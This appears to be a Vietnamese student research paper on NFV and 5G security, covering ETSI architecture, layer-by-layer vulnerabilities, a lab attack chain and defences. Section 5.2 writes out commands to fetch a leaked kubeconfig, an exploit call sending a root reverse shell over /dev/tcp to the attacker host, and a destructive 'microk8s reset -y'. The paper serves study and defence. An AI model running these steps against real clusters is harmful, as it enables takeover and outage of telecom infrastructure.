# PHÂN TÍCH NGUY CƠ BẢO MẬT TRONG HẠ TẦNG MẠNG ẢO HÓA (NFV) VÀ 5G
 *Experimental Analysis of Security Threats in NFV Infrastructure: Supply Chain Attack Simulation and Defensive Mechanisms*

---

##  Tóm tắt (Abstract)
Bài báo này phân tích các lỗ hổng bảo mật theo lớp (NFVI, MANO, VNF). Đặc biệt, thực nghiệm đã chứng minh chuỗi tấn công Leo thang Đặc quyền thành công, từ lỗi cấu hình (Lộ kubeconfig) đến việc khai thác lỗ hổng hệ thống (CVE-2022-0492) để chiếm Root Host, gây ra thảm họa Từ chối Dịch vụ (DoS) cho toàn bộ mạng lõi.

**Keywords:** NFV, 5G Security, Supply Chain Attack, VNF Integrity, ETSI Architecture

---

## 1. Giới thiệu (Introduction)
Trong mạng viễn thông truyền thống, các chức năng như **Firewall, Router, Load Balancer** được triển khai dưới dạng thiết bị phần cứng chuyên dụng. Mô hình này có nhiều hạn chế: chi phí đầu tư cao, khó nâng cấp, và thiếu linh hoạt khi nhu cầu lưu lượng thay đổi.  

NFV ra đời để giải quyết vấn đề này bằng cách **phần mềm hóa hạ tầng mạng**. Thay vì mua thiết bị vật lý, nhà mạng chỉ cần triển khai phần mềm VNF trên máy chủ tiêu chuẩn. Đây là bước ngoặt công nghệ, đặc biệt trong mạng 5G, nơi NFV là nền tảng bắt buộc.

---


## 2. Kiến thức nền về NFV (Background)

### 2.1. Khái niệm NFV
**Network Functions Virtualization (NFV)** là công nghệ cho phép chuyển đổi các chức năng mạng truyền thống (Firewall, Router, IPS…) từ thiết bị phần cứng chuyên dụng sang phần mềm chạy trên máy chủ x86 tiêu chuẩn.  

- **Ý tưởng cốt lõi:** Tách phần mềm VNF khỏi phần cứng vật lý  
- **Lợi ích chính:**
  - Giảm chi phí CAPEX/OPEX  
  - Tăng khả năng mở rộng và triển khai nhanh  
  - Dễ dàng nâng cấp, thay thế hoặc mở rộng tính năng  
  - Tự động hóa bằng MANO  

---

### 2.2. NFV và SDN (mối quan hệ quan trọng)

NFV thường được triển khai kết hợp với **SDN (Software-Defined Networking):**

| Công nghệ | Mục tiêu | Vai trò |
|-----------|----------|---------|
| **NFV**  | Ảo hóa chức năng mạng | Xử lý dịch vụ ở tầng VNF |
| **SDN**  | Tách Control-plane và Data-plane | Điều khiển đường đi của luồng gói tin |

SDN điều khiển luồng, NFV xử lý luồng → tạo thành hệ sinh thái **5G linh hoạt**.

---

### 2.3. Kiến trúc ETSI NFV (chuẩn hóa)

Theo ETSI, NFV bao gồm **3 khối chính**:

1. **NFVI (NFV Infrastructure)**  
   - Phần cứng vật lý: server, storage, switch  
   - Lớp ảo hóa:  
     - Hypervisor: KVM, VMware ESXi  
     - Container: Docker, Kubernetes  
   - Cung cấp CPU/RAM/Network cho VNF  

2. **VNF (Virtual Network Functions)**  
   - Các chức năng mạng dưới dạng phần mềm: vRouter, vFirewall, vIDS, UPF…  
   - Có khả năng: triển khai – scale – update – terminate  

3. **MANO (Management and Orchestration)**  
   - **NFVO:** Điều phối dịch vụ mạng  
   - **VNFM:** Quản lý vòng đời VNF  
   - **VIM:** Quản lý tài nguyên NFVI (OpenStack, VMware vCloud)  

---

### 2.4. Vòng đời của VNF (ETSI VNFM Lifecycle)

Các giai đoạn chính của VNF:  
1. Initialization  
2. Instantiation  
3. Configuration  
4. Scaling (In/Out/Up/Down)  
5. Updating / Patching  
6. Termination  

Malware trong tấn công **Supply Chain** thường được cấy tại bước **1, 4 hoặc 5**.

---

### 2.5. Cơ sở So sánh: Hạ tầng Vật lý và NFV

#### 2.5.1. Mô hình Hạ tầng Cốt lõi

| Mô hình | Đặc điểm | Bề mặt Tấn công Tập trung |
| :--- | :--- | :--- |
| **Máy Chủ Vật Lý Riêng (Bare Metal Server)** | Là một máy tính vật lý duy nhất, không có lớp ảo hóa (Hypervisor) giữa phần cứng và hệ điều hành (OS). | **Firmware** (BIOS, BMC), **Kernel OS**, và **Ứng dụng** đang chạy. Khả năng cô lập giữa các ứng dụng là rất thấp. |
| **NFV (Network Function Virtualization)** | Kiến trúc ảo hóa, tách chức năng mạng (VNF/CNF) khỏi phần cứng độc quyền. Bao gồm các lớp: **VNF/CNF**, **NFVI**, và **MANO**. | **API** (MANO), **Lớp ảo hóa** (Hypervisor/Container Runtime), và **Codebase VNF**. |


#### 2.5.2. Luận điểm về Lợi ích Cốt lõi của NFV đối với 5G 🚀

NFV là yếu tố **bắt buộc** để 5G Core (5GC) có thể vận hành hiệu quả vì nó giải quyết các thách thức về hiệu suất và linh hoạt:

* **Tính linh hoạt (Flexibility) & Khả năng mở rộng (Scalability):** Cho phép dịch vụ mới được triển khai nhanh chóng (Scale-up/Scale-down) dựa trên nhu cầu người dùng, thay vì bị giới hạn bởi phần cứng.
* **Network Slicing:** Đây là tính năng đặc trưng của 5G, cho phép tạo ra các mạng logic độc lập (Slice) trên cùng một hạ tầng vật lý, đòi hỏi khả năng ảo hóa cao của NFV.
* **MEC (Multi-access Edge Computing):** NFV cho phép đặt các VNF quan trọng (như UPF) gần người dùng hơn tại biên mạng để giảm độ trễ.

#### 2.5.3. So sánh Bề mặt Tấn công và Rủi ro

NFV chuyển rủi ro từ **Phần cứng** sang **Phần mềm**, tạo ra một bề mặt tấn công rộng lớn hơn do tính đa lớp của kiến trúc.

| Đặc Điểm | Mạng Vật Lý Truyền Thống | Mạng Ảo Hóa NFV/Cloud |
| :--- | :--- | :--- |
| **Bản chất** | **Hardware-Centric** (Tấn công Firmware và OS độc quyền). | **Software-Centric** (Tấn công API, Lớp ảo hóa, VNF). |
| **Lớp Tấn công** | **3 Lớp chính** (Mạng, Thiết bị, Ứng dụng). | **5+ Lớp** (VNF, Container, NFVI, MANO, SDN). |
| **Điểm Tập trung** | Từng thiết bị mạng riêng lẻ. | **Tập trung tại MANO/Kubernetes API** (Điểm yếu duy nhất). |
| **Phạm vi Rủi ro** | Rủi ro cục bộ, bị cô lập bởi ranh giới vật lý. | Rủi ro Toàn cầu, do phụ thuộc vào **Lớp cô lập** (Container). |
| **Kỹ thuật Tấn công** | Tấn công DoS truyền thống, chiếm quyền qua cổng quản lý vật lý. | Tấn công chuỗi cung ứng, Khai thác Token API, **Container Escape** (như CVE-2022-0492). |
---

### 2.6. Tính thực tiễn trong mạng 5G

- **5G Core là NFV-based**  
- Thành phần chính của 5G Core đều là VNF/CNF:  
  - **AMF:** Access Management Function  
  - **SMF:** Session Management Function  
  - **UPF:** User Plane Function (xử lý data plane tốc độ cao)  

**Control Plane vs Data Plane:**  
- Control-plane: SMF, AMF → điều khiển phiên kết nối  
- Data-plane: UPF → xử lý lưu lượng người dùng  

Tấn công vào **UPF** có thể nghe lén/chuyển hướng toàn bộ traffic.  

**Network Slicing:**  
- Cho phép tạo các slice độc lập cho từng dịch vụ  
- Ví dụ: slice cho xe tự hành, IoT, video streaming  

---

### 2.7. Cơ chế SFC (Service Function Chaining)

- **Điều khiển bởi:**  
  - SDN Controller (OpenDaylight, ONOS)  
  - NSH (Network Service Header) – gắn metadata để phân biệt từng luồng  

**Ví dụ chuỗi dịch vụ:**  
User → vFirewall → vIDS → vRouter → Internet

** Nếu hacker chiếm một VNF, họ có thể thay đổi thứ tự hoặc chèn VNF độc hại. **

---

## 3. Phân tích lỗ hổng bảo mật (Security Analysis)

### 3.1. Lỗ hổng tại NFVI
Lớp NFVI, bao gồm phần cứng và lớp ảo hóa (Hypervisor/Container Runtime), là nền tảng vật lý cho toàn bộ hệ thống. Các lỗ hổng tại đây có thể dẫn đến việc kiểm soát Host vật lý.

- Tấn công Lớp Ảo hóa (VM Escape): Khai thác các lỗi trong Hypervisor (KVM, VMware ESXi) để thoát khỏi ranh giới Máy ảo (VM) và chiếm quyền Host vật lý.

- Lỗi Cô lập Container (Container Escape): Khai thác các lỗ hổng trong Container Runtime hoặc Linux Kernel (ví dụ: CVE-2022-0492 - lỗi cgroups v1) để leo thang đặc quyền từ Container Root lên Host Root (NFVI Host). Đây là rủi ro nghiêm trọng nhất đối với hệ thống CNF (Containerized Network Functions) của 5G.

- Lỗ hổng Driver/Firmware: Các thành phần phần cứng như NIC, BIOS, hoặc các module Kernel I/O có thể chứa các lỗ hổng chưa được vá, cho phép thực thi mã độc ở cấp độ thấp (Ring-0) trên Host.

### 3.2. Lỗ hổng tại MANO
MANO (NFVO, VNFM, VIM) là Control Plane của NFV, quản lý vòng đời và cấu hình VNF. Lỗ hổng tại lớp này cấp quyền kiểm soát toàn bộ NFV Core.

- Lỗ hổng API (API Vulnerabilities): Khai thác các lỗ hổng trong các API của NFVO/VNFM, bao gồm Injection Attacks (SQLi, Command Injection) hoặc lỗi logic trong quá trình xác thực.

- Lỗi Cấu hình Phân quyền (Broken Access Control): Sai cấu hình phân quyền RBAC (Role-Based Access Control) hoặc rò rỉ các file cấu hình quan trọng như kubeconfig hoặc Service Account Tokens. Điều này dẫn đến chiếm quyền quản trị (Admin) toàn cục và khả năng điều khiển vòng đời VNF trái phép (ví dụ: TERMINATE hoặc SCALE-OUT).

- Thao túng Orchestration: Tấn công vào quy trình ra quyết định của NFVO để điều khiển việc khởi tạo (Instantiation), mở rộng (Scaling), hoặc chấm dứt (Termination) VNF một cách trái phép.

### 3.3. Lỗ hổng tại VNF
**VNF là các ứng dụng phần mềm thực hiện chức năng mạng. Chúng là mục tiêu dễ bị tấn công nhất.**

- Lỗ hổng Ứng dụng (Application Flaws): Các VNF tự thân có thể chứa các lỗi phần mềm truyền thống (Buffer Overflows, Logic Bugs) trong mã nguồn, cho phép chiếm quyền Root bên trong Container/VM.

- Rủi ro Tính toàn vẹn (Integrity Risk): Do VNF là file ảnh (image) được tải từ kho bên ngoài, chúng dễ bị thay đổi, cấy mã độc hoặc Backdoor trong quá trình lưu trữ hoặc phân phối (xem mục 4.1).

- Hậu quả khi bị chiếm: VNF bị chiếm có thể trở thành "man-in-the-middle" (MITM) nội bộ, cho phép nghe lén, chuyển hướng traffic toàn mạng (đặc biệt là UPF), hoặc làm bàn đạp tấn công các VNF Control Plane khác.


---
## 4.Phân tích Rủi ro Bảo mật Tiên tiến 
---
### 4.1. Tấn công Chuỗi Cung ứng Nhắm vào Tính Toàn vẹn VNF (VNF Integrity Attack)
Đây là mối đe dọa lớn nhất đối với NFV, tận dụng sự phụ thuộc vào các bên thứ ba (Third-party Vendors).

- **Bản chất Rủi ro:** Khác với tấn công mạng truyền thống, kiểu tấn công này nhắm vào khâu phát triển, lưu trữ, hoặc phân phối phần mềm VNF.

- **Kỹ thuật Lây nhiễm:** Kẻ tấn công cấy mã độc (Trojan/Backdoor) vào file ảnh VNF (.qcow2, Docker image) ngay tại kho lưu trữ (Supply Chain Stage).

- **Hậu quả:** VNF độc hại được triển khai cùng với chức năng mạng hợp lệ, bỏ qua các lớp bảo mật ngoại vi, và thâm nhập trực tiếp vào trung tâm mạng lõi (NFVI). Mã độc được triển khai đồng thời với chức năng mạng, tạo ra một VNF độc hại hợp lệ.

---

## 4.2. Khai thác Lỗ hổng Kiến trúc và Leo Thang Đặc quyền (Escalation Path)
Sự kết hợp giữa lỗ hổng cấu hình và lỗi hệ thống tạo ra con đường leo thang từ Data Plane lên Control Plane, và cuối cùng là Host vật lý.

### 4.2.1. Phá vỡ Ranh giới Cô lập Nội bộ (Isolation Failure)
- **Zero Trust Boundary:** Kiến trúc 5G SBA (Service-Based Architecture) dựa trên giả định các chức năng mạng (AMF, SMF, UPF) là đáng tin cậy. Nếu một VNF bị chiếm (thông qua tấn công Chuỗi cung ứng), nó có thể thực hiện lây lan ngang (Lateral Movement) tới các VNF quan trọng khác mà không bị chặn bởi các rào cản mạng nội bộ nghiêm ngặt.
- **Container Escape** là Con đường Nâng cấp: Việc khai thác các lỗi như CVE-2022-0492 là minh chứng rõ ràng nhất cho sự thất bại của ranh giới cô lập, cho phép Hacker nhảy từ Data Plane (VNF) $\rightarrow$ Host Root (NFVI).

### 4.2.2. Tác động của Việc Chiếm quyền Control Plane
- Việc chiếm quyền MANO (NFVO/VNFM) là đỉnh cao của cuộc tấn công, cho phép Hacker gây ra hậu quả thảm khốc.

- Thao túng Orchestration (Zombie Strategy): Hacker có thể ra lệnh TERMINATE tất cả các VNF hợp lệ, gây Từ chối Dịch vụ (DoS) cho toàn bộ mạng 5G. Hoặc triển khai hàng loạt Zombie VNF (SCALE-OUT VNF độc hại trên diện rộng) để tạo ra một cuộc Tấn công Từ chối Dịch vụ Phân tán (DDoS) quy mô lớn từ bên trong mạng lõi.

- Kiểm soát Network Slicing: Chiếm quyền NFVO cho phép Hacker thao túng ranh giới các Slice, ví dụ: chèn VNF độc hại vào một Slice cụ thể (như Slice Critical Service) hoặc chuyển hướng lưu lượng từ một Slice an toàn sang Slice bị giám sát/kiểm soát.

## 5. Thực nghiệm 
## 5.1. Thiết lập Môi trường Mô phỏng

Môi trường được thiết lập dựa trên mô hình NFV đơn giản, sử dụng Kubernetes (MicroK8s) làm Orchestrator.

| Thành phần | Vai trò | Lỗ hổng Cài đặt sẵn (Giả lập) |
| :--- | :--- | :--- |
| **NFVI Host** (`192.168.1.10`) | Nền tảng vật lý (Host OS, Kernel, MicroK8s). | **Lỗi 1 (Vận hành):** File `kubeconfig` bị lộ trên Web Server `8080`. |
| **Attacker Host** (`192.168.1.21`) | Kali Linux (Công cụ: `kubectl`, `gobuster`, `netcat`). | **Lỗi 2 (Hệ thống):** Kernel Host chứa lỗ hổng **CVE-2022-0492**. |

---

## 5.2. Chuỗi Tấn công Hoàn chỉnh (The Attack Chain)

Cuộc tấn công được chia thành ba giai đoạn chính, leo thang đặc quyền từ bên ngoài vào Root Host.

### 5.2.1. Pha I: Xâm nhập Ban đầu và Chiếm Control Plane (MANO)

Hacker khai thác lỗi cấu hình (Lỗi Vận hành) để chiếm quyền quản trị toàn bộ hệ thống NFV.

* **Hành động:** Quét thư mục bị lộ và tải file `kubeconfig`.
* **Mục tiêu đạt được:** Quyền **Cluster-Admin** đối với Kubernetes.
* **Lệnh Chứng minh (Attacker Host):**
    ```bash
    # 1. Chiếm quyền truy cập API Server
    curl http://192.168.1.10:8080/admin_kubeconfig_2025.txt
    curl http://192.168.1.10:8080/admin_kubeconfig_2025.txt -o ./hacked_config
    
    # 2. Thiết lập quyền và kiểm tra
    export KUBECONFIG=./hacked_config
    kubectl get nodes
    ```

### 5.2.2. Pha II: Chiếm Data Plane và Vượt rào Cô lập (Container Escape)

Với quyền Admin, Hacker triển khai VNF độc hại và khai thác lỗi Kernel để leo thang lên Root Host.

* **Hành động:** Triển khai Pod VNF với cấu hình đặc quyền (`privileged: true`), sau đó chạy mã khai thác **CVE-2022-0492**.
* **Mục tiêu đạt được:** Quyền **Root** trên **Host NFVI**.

| Thao tác | Lệnh Thực hiện | Kết quả |
| :--- | :--- | :--- |
| **Triển khai VNF** | `kubectl apply -f malicious_pod.yaml` | Pod VNF độc hại được khởi tạo. |
| **Khai thác CVE** | `/tmp/exploit_2022.bin ... /dev/tcp/192.168.1.21/5555 ...` | Kernel Host bị khai thác, gửi Reverse Shell Root về Attacker Host. |
| **Kiểm tra Quyền Host** | `whoami; cat /etc/os-release` | Output: `root` (NFVI Host) $\rightarrow$ **Xác nhận leo thang thành công.** |

### 5.2.3. Pha III: Phá hủy Hệ thống (Action on Objective)

Hacker sử dụng quyền Root Host để thực hiện lệnh gây thiệt hại tối đa, gây ra thảm họa **DoS**.

* **Hành động:** Ra lệnh xóa bỏ toàn bộ NFV Orchestrator (MicroK8s) khỏi Host.
* **Mục tiêu đạt được:** Gây **Thảm họa Từ chối Dịch vụ (DoS)** cho toàn bộ mạng 5G Core.
* **Lệnh Hủy hoại (Root Host Shell):**
    ```bash
    # Lệnh phá hủy toàn bộ Orchestrator và các VNF đang chạy
    microk8s reset -y
    ```

---

## 5.3. Phân tích Kết quả Thực nghiệm

Thực nghiệm đã chứng minh trực quan **tính mở rộng của bề mặt tấn công NFV** và **rủi ro toàn cục** từ lỗi đơn lẻ:

* **Sự Thất bại của Cô lập:** Việc khai thác thành công **CVE-2022-0492** đã phá vỡ rào cản bảo mật Container, cho phép Hacker nhảy từ Data Plane (VNF) lên Root Host (NFVI).
* **Tác động Toàn cục:** Tấn công chỉ bắt đầu từ một lỗi cấu hình đơn giản (`kubeconfig leak`), nhưng kết thúc bằng việc phá hủy toàn bộ Control Plane và các VNF.
* **Đánh giá Rủi ro:** Khả năng Hacker thực thi lệnh phá hủy (`microk8s reset -y`) chứng minh rằng một cuộc tấn công chiếm quyền có thể dẫn đến **mất tính khả dụng (Availability)** nghiêm trọng cho hạ tầng viễn thông.



--- 
---
## 6. CƠ CHẾ PHÒNG THỦ (DEFENSE MECHANISMS)
Phần này đề xuất các chiến lược phòng vệ đa lớp (Layered Defense) nhằm đối phó với các rủi ro đã phân tích.

### 6.1. Bảo vệ Lớp NFVI (Chống Container Escape)
* **Hardening Kernel:** Thường xuyên vá lỗi Kernel và áp dụng các mô hình bảo mật như **SELinux/AppArmor** để tăng cường khả năng cô lập.
* **Sử dụng gVisor hoặc Kata Containers:** Sử dụng các công nghệ cô lập sandbox mạnh hơn (ví dụ: User-space Kernel - gVisor hoặc Hypervisor-backed Containers - Kata) để vô hiệu hóa các lỗi Kernel như CVE-2022-0492.
* **Loại bỏ Privileged Containers:** Không cấp quyền `privileged: true` cho các VNF trừ khi hoàn toàn cần thiết.

### 6.2. Bảo vệ Lớp MANO (Chống Broken Access Control)
* **Zero Trust Architecture (ZTA):** Áp dụng nguyên tắc "Never Trust, Always Verify" cho API nội bộ (AMF-SMF, NFVO-VNFM).
* **Quản lý Bí mật và Cấu hình:** Sử dụng công cụ **Secrets Management** (như HashiCorp Vault) để lưu trữ `kubeconfig` và các API Token thay vì lưu dưới dạng file.
* **RBAC Policy Enforcement:** Áp dụng mô hình **Least Privilege** cho các Service Account và người dùng MANO.

### 6.3. Chống Tấn công Chuỗi Cung ứng (Integrity Assurance)
* **Image Signing và Verification:** Yêu cầu tất cả VNF Image phải được ký số (ví dụ: sử dụng **Notary** hoặc **Sigstore/Cosign**). Hệ thống NFVO chỉ chấp nhận triển khai VNF từ các nhà cung cấp đã được xác minh.
* **Runtime Integrity Monitoring:** Giám sát thời gian chạy (Runtime Security) của VNF để phát hiện các hoạt động bất thường (ví dụ: thay đổi file hệ thống, mở cổng mạng lạ) sau khi VNF đã được triển khai.

---
## 7. Kết luận (Conclusion)
NFV là nền tảng bắt buộc trong hạ tầng 5G, mang lại nhiều lợi ích về chi phí và linh hoạt. Tuy nhiên, nó cũng mở rộng bề mặt tấn công, đặc biệt ở khâu chuỗi cung ứng VNF. Việc nghiên cứu, mô phỏng và kiểm thử các kịch bản tấn công là cần thiết để xây dựng cơ chế phòng vệ hiệu quả, đảm bảo tính toàn vẹn và an toàn cho hạ tầng viễn thông quốc gia.

---

## Tài liệu tham khảo (References)
1. ETSI NFV Architecture Overview.  
2. Schardong et al., “Survey on VNF Placement and Chaining,” 2021.  
3. Nguyễn Văn Quân, “Khóa luận tốt nghiệp về NFV Optimization,” 2023.  
4. 3GPP 5G Security Standards.  

---
